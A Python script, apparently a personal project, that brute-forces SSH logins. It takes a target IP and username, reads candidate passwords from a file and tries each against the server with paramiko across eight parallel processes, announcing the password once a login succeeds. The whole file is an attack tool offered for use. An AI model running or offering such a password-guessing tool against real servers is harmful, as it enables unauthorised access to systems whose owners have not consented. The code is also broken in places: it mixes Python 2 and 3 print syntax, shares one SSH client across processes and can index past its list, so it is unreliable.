import multiprocessing as mp
from multiprocessing import Value, Lock
import paramiko
import time
import optparse
from net_tools import get_ping

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", help="user name on the server")
    #parser.add_option("-p", "--protocol", dest="protocol", help="Protocol you want to use (SSH, FTP...)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    #elif not options.protocol:
    #    parser.error("[-] Please specify a protocol, use --help for more info")
    return options 

#def ssh_attack(user,address,password):
def ssh_attack(user,address,password,event,q,i, found_password):
    if not event.is_set():
        print(i)
        i.value+=1
        print('Testing password: ' + password)
        try :
            ssh.connect(address, username=user, password=password)
            print('found')
            q.put(password)
            found_password.value=password
            print(password)
            event.set()
            return True

        except paramiko.ssh_exception.AuthenticationException as e :
            print(e)
            return False

        except paramiko.ssh_exception.NoValidConnectionsError as e :
            print(e)
            return False


if __name__ == '__main__':
    options = get_arguments()
    print("[+]Preparing brute force on server at IP "+ options.target)

    #Checking if the server can be pinged
    get_ping(str(options.target))

    #retrieving a dictionnary of password
    pass_list = ['test1','test2','test3', 'toor']

    #creating the ssh connection object
    ssh = paramiko.SSHClient()

    #this is to add new host automatically
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #openning password dictionnary
    f = open('pass.txt','r')

    ################################
    #Preparing the multiprocessing
    #Working with pool, because you cannot set the number of process with the process class

    #Preparing the pool
    pool = mp.Pool(processes=8)

    # Preparing the array to return the password value

    manager = mp.Manager()
    queue = manager.Queue() #This is needed to retrieve the final password
    event = manager.Event() #This is needed to stop the processing when password is found
    t1 = time.time()
    queue.put(0)
    #creating a lock for debugging purpose
    lock = Lock()
    #Create a value that can be shared between processes
    index=manager.Value('i',0) 

    #Create a value to store the final password if found
    found_password=manager.Value('s','') 

#    #start looping over the passwords in the file
#    with open('pass.txt','r') as file_list:
#        for password in file_list:
#            if password.strip() == "" : continue
#            password = password.strip()
#            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, password, event,queue,i))
#            #time.sleep(0.1)
#    print("The password is " + queue.get())
#    print('Code executed in: '+ str(time.time() - t1))
#    exit(0)
#
##############################3
#Working with process
#    for password in pass_list:
    num_process=8
    with open('pass.txt','r') as file_list:
       line = 0
       password_list = [i.strip() for i in file_list.readlines()]
       process_list =[]
       while password_list:
           temp_list = password_list[:num_process]
           print len(temp_list)
           for i in range(0,num_process):
               process_list.append(mp.Process(target=ssh_attack, \
                       args=(options.user, options.target, temp_list[i], event,queue, index, found_password)) )
               process_list[-1].start()
           print temp_list
          # p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,queue, i))
           for i in range(0,num_process):
               process_list[i].join()

           #reset the list to feed to the process and update the password list
           del password_list[:num_process]
           process_list =[]
           print("qsize"+str(queue.qsize()))

           if queue.qsize()>=2:
               print("Oh yeah baby, we found it! The password is " + str(found_password.value))
               break 


    print("We are done here!")    
               #queue.get()
               #print("Oh yeah baby, we found it!")
   #    for password in file_list:
   #        if password.strip() == "" : continue
   #        password = password.strip()
   #        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,queue, i))
   #        p.start()
   #        p.join()
   # print("The password is " + q.get())
   # print(array[:])
